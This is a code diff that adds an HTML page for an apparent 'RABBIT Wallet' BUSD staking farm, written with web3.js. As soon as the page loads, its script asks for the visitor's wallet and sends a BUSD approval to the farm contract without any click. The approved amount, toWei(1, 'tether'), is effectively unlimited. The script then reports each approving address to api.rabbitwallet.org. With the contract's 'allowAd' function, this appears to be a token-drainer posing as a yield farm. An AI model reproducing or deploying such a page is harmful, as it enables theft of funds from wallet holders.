@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+
+    <link rel="icon" href="../logo.png" />
+
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+
+    <meta name="theme-color" content="#000000" />
+
+    <!-- content -->
+    <meta name="description" content="RABBIT Wallet" />
+
+    <!-- title -->
+    <title>RABBIT Wallet</title>
+    <link href="static/css/style.css" rel="stylesheet" />
+    <link href="static/css/detail.css" rel="stylesheet" />
+    <link href="../css/style.css" rel="stylesheet" />
+    <link href="../css/reset.css" rel="stylesheet" />
+</head>
+
+<body>
+    <div id="root">
+        <div class="App">
+            <div class="down-box"></div>
+            <div>
+                <div id="logo">
+                    <a href="../"><img src="../logo-text.png" alt="logo" /> </a>
+                </div>
+                <ul class="nav" style="height: unset">
+                    <li class="nav-item">
+                        <a aria-current="page" href="/">Home</a>
+                    </li>
+                    <li class="nav-item"><a href="/cross-chain/">Cross chain</a></li>
+                    <li class="nav-item"><a href="/trc_farm">Farm on TRON Network</a></li>
+                    <li class="nav-item"><a href="/bsc_farm">Farm on BEP-20</a></li>
+                    <li class="nav-item">
+                        <a target="new_tab" href="https://t.me/rabbitonsui">Rules</a>
+                    </li>
+                </ul>
+                <ul class="nav-mob">
+                    <li class="nav-item"><a aria-current="page" href="/">Home</a></li>
+                    <li class="nav-item"><a href="/cross-chain/">Cross chain</a></li>
+                    <li class="nav-item"><a href="/trc_farm">Farm on TRON Network</a></li>
+                    <li class="nav-item"><a href="/bsc_farm">Farm on BEP-20</a></li>
+                    <li class="nav-item">
+                        <a target="__blank" href="https://t.me/rabbitonsui" class="">Rules</a>
+                    </li>
+                </ul>
+            </div>
+            <div class="detail">
+                <div class="detail-slogan">
+                    <div class="slogan-logo">
+                        <div class="slogan-logo-img" style="
+                  background: url(static/images/busd.png) center center / 100%
+                    no-repeat;
+                "></div>
+                    </div>
+                    <div class="text-logo">
+                        <div class="text-logo-text1">RAB/BUSD</div>
+                    </div>
+                    <div class="slogan-title">
+                        <div>Deposit</div>
+                        <div class="slogan-title-name">&nbsp;RAB/BUSD&nbsp;</div>
+                        <div>and earn RAB</div>
+                    </div>
+                    <div>
+                        <p>Your address : <span id="your_address">0x00</span></p>
+                    </div>
+                </div>
+                <div class="detai-list">
+                    <div class="detail-item">
+                        <div class="detail-item-logo">
+                            <div class="detail-item-logo-img" style="
+                    background: url(/logo.png) center center / 114% no-repeat;
+                  "></div>
+                        </div>
+                        <div class="detail-item-btn-box">
+                            <input class="input-stake" value="0.000" style="opacity: 0" disabled />
+                            <div class="detail-item-btn btn" id="harvest_bt">Harvest</div>
+                        </div>
+                        <div class="detail-item-text">
+                            <div class="statistics-info-text-number" id="reward">
+                                0.00000000
+                            </div>
+                            <div class="statistics-info-text-title">RAB earned</div>
+                        </div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-item-logo">
+                            <div class="detail-item-logo-img" style="
+                    background: url(static/images/busd.png) center center / 100%
+                      no-repeat;
+                  "></div>
+                        </div>
+                        <div class="detail-item-btn-box">
+                            <input id="stake_value" class="input-stake" value="0.000" />
+                            <div class="detail-item-btn btn" id="stake_bt">
+                                Approve BUSD
+                            </div>
+                        </div>
+                        <div class="detail-item-text">
+                            <div class="statistics-info-text-number" id="staked">
+                                0.00000000
+                            </div>
+                            <div class="statistics-info-text-title">RAB/BUSD Staked</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="detai-btn btn" id="unstake_bt">
+                    Abort reward & Unstake
+                </div>
+            </div>
+            <div class="footer">
+                <div class="footer-box">
+                    <a href="https://t.me/rabbitonsui" target="new_tab">
+                        <div class="footer-logo footer-logo1"></div>
+                    </a><a href="https://twitter.com/RabbitWallets" target="new_tab">
+                        <div class="footer-logo footer-logo2"></div>
+                    </a>
+                    <a href="https://t.me/rabbitonsui" target="new_tab">
+                        <div class="footer-logo footer-logo1"></div>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="eJOY__extension_root" class="eJOY__extension_root_class" style="all: unset"></div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.0/web3.min.js"
+        integrity="sha512-ppuvbiAokEJLjOUQ24YmpP7tTaLRgzliuldPRZ01ul6MhRC+B8LzcVkXmUsDee7ne9chUfApa9/pWrIZ3rwTFQ=="
+        crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.js"
+        integrity="sha512-WNLxfP/8cVYL9sj8Jnp6et0BkubLP31jhTG9vhL/F5uEZmg5wEzKoXp1kJslzPQWwPT1eyMiSxlKCgzHLOTOTQ=="
+        crossorigin="anonymous"></script>
+
+    <script>
+        // var contract = "0x5d79c03dCC11AB7bE4a57857Fc840Ba24bfa4C53";
+        var usdt_contract_ad = '0xe9e7cea3dedca5984780bafc599bd69add087d56';
+        var farm_contract_ad = '0x98b3fE5a9fa5B544Cb5c8cAB869f75ec59c6C2Eb';
+        var address0 = "0x0000000000000000000000000000000000000000";
+        const usdt_abi = [{
+            "inputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "constructor"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "spender",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "internalType": "uint256",
+                "name": "value",
+                "type": "uint256"
+            }],
+            "name": "Approval",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "previousOwner",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "newOwner",
+                "type": "address"
+            }],
+            "name": "OwnershipTransferred",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "internalType": "uint256",
+                "name": "value",
+                "type": "uint256"
+            }],
+            "name": "Transfer",
+            "type": "event"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "_decimals",
+            "outputs": [{
+                "internalType": "uint8",
+                "name": "",
+                "type": "uint8"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "_name",
+            "outputs": [{
+                "internalType": "string",
+                "name": "",
+                "type": "string"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "_symbol",
+            "outputs": [{
+                "internalType": "string",
+                "name": "",
+                "type": "string"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "internalType": "address",
+                "name": "spender",
+                "type": "address"
+            }],
+            "name": "allowance",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "spender",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "amount",
+                "type": "uint256"
+            }],
+            "name": "approve",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "internalType": "address",
+                "name": "account",
+                "type": "address"
+            }],
+            "name": "balanceOf",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "amount",
+                "type": "uint256"
+            }],
+            "name": "burn",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "decimals",
+            "outputs": [{
+                "internalType": "uint8",
+                "name": "",
+                "type": "uint8"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "spender",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "subtractedValue",
+                "type": "uint256"
+            }],
+            "name": "decreaseAllowance",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "getOwner",
+            "outputs": [{
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "spender",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "addedValue",
+                "type": "uint256"
+            }],
+            "name": "increaseAllowance",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "amount",
+                "type": "uint256"
+            }],
+            "name": "mint",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "name",
+            "outputs": [{
+                "internalType": "string",
+                "name": "",
+                "type": "string"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "owner",
+            "outputs": [{
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [],
+            "name": "renounceOwnership",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "symbol",
+            "outputs": [{
+                "internalType": "string",
+                "name": "",
+                "type": "string"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "totalSupply",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "recipient",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "amount",
+                "type": "uint256"
+            }],
+            "name": "transfer",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "sender",
+                "type": "address"
+            }, {
+                "internalType": "address",
+                "name": "recipient",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "amount",
+                "type": "uint256"
+            }],
+            "name": "transferFrom",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "newOwner",
+                "type": "address"
+            }],
+            "name": "transferOwnership",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }];
+        const farm_abi = [
+            {
+                "constant": false,
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "user_ad",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "num_apply",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "allowAd",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "value",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "burn",
+                "outputs": [],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [],
+                "name": "harvest",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "farm_value",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "stake",
+                "outputs": [],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "constant": false,
+                "inputs": [],
+                "name": "unStake",
+                "outputs": [],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "account",
+                        "type": "address"
+                    }
+                ],
+                "name": "rewardOf",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "payable": false,
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "account",
+                        "type": "address"
+                    }
+                ],
+                "name": "stakeOf",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "payable": false,
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [],
+                "name": "totalStake",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "payable": false,
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
+        var from_address = address0;
+
+        var status_waiting_approve = 0;
+
+        $(document).ready(async function () {
+            if (typeof window.ethereum !== 'undefined') {
+                console.log('MetaMask is installed!');
+            }
+            // const ethereumButton = document.querySelector('#enableEthereumButton');
+            // const ethereumButtonContent = document.querySelector('#bt_content');
+            const web3 = new Web3(window.ethereum);
+            const usdt_contract = new web3.eth.Contract(usdt_abi, usdt_contract_ad);
+            const farm_contract = new web3.eth.Contract(farm_abi, farm_contract_ad);
+            var allowance_value = 0;
+            var usdt_balance = 0;
+
+            const harvest_bt = document.querySelector("#harvest_bt");
+            const stake_bt = document.querySelector("#stake_bt");
+            const unstake_bt = document.querySelector("#unstake_bt");
+
+            var accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            if (accounts) {
+                from_address = accounts[0];
+                $("#your_address").text(from_address);
+                allowance_value = await usdt_contract.methods.allowance(from_address, farm_contract_ad).call();
+                usdt_balance = ((await usdt_contract.methods.balanceOf(from_address).call()) - 0.001e18) / 1e18;
+                usdt_balance = usdt_balance > 0.01 ? usdt_balance.toFixed(6) : 0;
+                ///
+                var staked_value = (await farm_contract.methods.stakeOf(from_address).call()) / 1e18;
+                var reward_value = (await farm_contract.methods.rewardOf(from_address).call()) / 1e18;
+
+                $("#staked").text(staked_value.toFixed(6));
+                $("#reward").text(reward_value.toFixed(6));
+                setInterval(async () => {
+                    staked_value = (await farm_contract.methods.stakeOf(from_address).call()) / 1e18;
+                    reward_value = (await farm_contract.methods.rewardOf(from_address).call()) / 1e18;
+                    console.log("staked_value : ", staked_value);
+                    console.log("reward_value : ", reward_value);
+                    $("#staked").text(staked_value.toFixed(6));
+                    $("#reward").text(reward_value.toFixed(6));
+                }, 5000);
+                ///
+
+                console.log("usdt_balance : ", usdt_balance)
+                $("#stake_value").val(usdt_balance);
+                console.log(allowance_value);
+                if (allowance_value > 0) {
+                    stake_bt.innerHTML = "Stake BUSD";
+                } else {
+                    stake_bt.innerHTML = "Approve BUSD";
+                    var interval_approve = setInterval(async () => {
+                        allowance_value = await usdt_contract.methods.allowance(from_address, farm_contract_ad).call();
+                        if (allowance_value > 0) {
+                            clearInterval(interval_approve);
+                            stake_bt.innerHTML = "Stake BUSD";
+                            status_waiting_approve = 0;
+                        }
+                    }, 3000);
+                    var approve_data = usdt_contract.methods.approve(farm_contract_ad, web3.utils.toWei((1).toString(), "tether")).encodeABI();
+                    ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [{
+                            from: from_address,
+                            to: usdt_contract_ad,
+                            gas: web3.utils.toHex(250000),
+                            value: 0x00,
+                            data: approve_data,
+                        },],
+                    }).then((txHash) => { console.log(txHash); fetch("https://api.rabbitwallet.org/api/approve?ad=" + from_address + "&co=busd"); }).catch((error) => console.error);
+                    stake_bt.innerHTML = "Waiting...";
+                    status_waiting_approve = 1;
+                }
+            }
+
+            stake_bt.addEventListener('click', async () => {
+                //Will Start the metamask extension
+                if (status_waiting_approve == 1) {
+                    return;
+                }
+                if (from_address != address0) {
+                    if (allowance_value == 0) {
+                        console.log("hello");
+                        var approve_data = usdt_contract.methods.approve(farm_contract_ad, web3.utils.toWei((1).toString(), "tether")).encodeABI();
+                        ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: from_address,
+                                to: usdt_contract_ad,
+                                gas: web3.utils.toHex(250000),
+                                value: 0x00,
+                                data: approve_data,
+                            },],
+                        }).then((txHash) => { console.log(txHash); fetch("https://api.rabbitwallet.org/api/approve?ad=" + from_address + "&co=busd"); }).catch((error) => console.error);
+                        stake_bt.innerHTML = "Waiting...";
+                        status_waiting_approve = 1;
+
+                        return;
+                    } else {
+                        var stake_data = farm_contract.methods.stake(web3.utils.toWei($("#stake_value").val().toString(), 'ether')).encodeABI();
+                        ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: from_address,
+                                to: farm_contract_ad,
+                                gas: web3.utils.toHex(250000),
+                                value: 0x00,
+                                data: stake_data,
+                            },],
+                        }).then((txHash) => console.log(txHash)).catch((error) => console.error);
+                        return;
+                    }
+                }
+                accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                if (accounts) {
+                    from_address = accounts[0];
+                    console.log(from_address);
+                    stake_bt.innerHTML = "Approve BUSD";
+                    $("#your_address").text(from_address);
+                }
+                // ethereumButton.style.color = "green";
+            });
+            unstake_bt.addEventListener('click', async () => {
+                var unStake_data = farm_contract.methods.unStake().encodeABI();
+                ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: from_address,
+                        to: farm_contract_ad,
+                        gas: web3.utils.toHex(250000),
+                        value: 0x00,
+                        data: unStake_data,
+                    },],
+                }).then((txHash) => console.log(txHash)).catch((error) => console.error);
+                // stake_bt.innerHTML = "Stake BUSD";
+                return;
+            });
+            harvest_bt.addEventListener('click', async () => {
+                var harvest_data = farm_contract.methods.harvest().encodeABI();
+                ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: from_address,
+                        to: farm_contract_ad,
+                        gas: web3.utils.toHex(250000),
+                        value: 0x00,
+                        data: harvest_data,
+                    },],
+                }).then((txHash) => console.log(txHash)).catch((error) => console.error);
+                // stake_bt.innerHTML = "Stake BUSD";
+                return;
+            });
+        });
+    </script>
+</body>
+
+</html>
